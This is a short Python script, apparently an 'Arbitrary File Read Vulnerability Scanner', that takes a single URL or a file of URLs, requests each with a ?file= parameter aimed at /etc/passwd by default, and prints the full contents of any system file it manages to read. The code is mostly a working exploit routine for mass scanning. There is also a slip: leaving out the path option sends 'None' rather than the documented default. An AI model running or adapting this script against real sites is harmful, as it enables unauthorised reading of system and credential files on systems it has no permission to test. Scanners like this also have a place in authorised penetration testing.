# -*- coding: utf-8 -*-
import requests
import argparse
import time


def banner():
    print("""

 _______  ___   ___      _______    ______    _______  _______  ______  
|       ||   | |   |    |       |  |    _ |  |       ||   _   ||      | 
|    ___||   | |   |    |    ___|  |   | ||  |    ___||  |_|  ||  _    |
|   |___ |   | |   |    |   |___   |   |_||_ |   |___ |       || | |   |
|    ___||   | |   |___ |    ___|  |    __  ||    ___||       || |_|   |
|   |    |   | |       ||   |___   |   |  | ||   |___ |   _   ||       |
|___|    |___| |_______||_______|  |___|  |_||_______||__| |__||______| 

                                                                       
    tag: This is a scanner used to scan for file read vulnerabilities
    @author: zxy
    @version: 1.0.0
    """)

def test_file_read_vulnerability(url, headers=None, file_path="/etc/passwd", delay=0):
    target_url = f"{url}?file={file_path}"

    try:
        response = requests.get(target_url, headers=headers)

        if "root:" in response.text:
            print(f"[+] Vulnerable to File Read: {target_url}")
            print("File content:")
            print(response.text)
        else:
            print(f"[-] Not vulnerable: {target_url}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {str(e)}")

    # 添加延迟，以防止请求过于频繁
    time.sleep(delay)


def main():
    parser = argparse.ArgumentParser(description='Arbitrary File Read Vulnerability Scanner')
    parser.add_argument("-u", "--url", dest="url", type=str, help="example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help="urls.txt")
    parser.add_argument("-p", "--path", dest="path", type=str,
                        help="File path to read (default:/etc/passwd)")
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=0, help="Delay between requests in seconds")


    args = parser.parse_args()

    if args.url:
        test_file_read_vulnerability(args.url, headers={"User-Agent": "Mozilla/5.0"}, file_path=args.path,
                                     delay=args.delay)
    elif args.file:
        with open(args.file, "r") as url_file:
            for line in url_file:
                target_url = line.strip()
                test_file_read_vulnerability(target_url, headers={"User-Agent": "Mozilla/5.0"}, file_path=args.path,
                                             delay=args.delay)
    else:
        print(f"Usage: python {__file__} -u <url> or -f <urls.txt>")


if __name__ == '__main__':
    main()
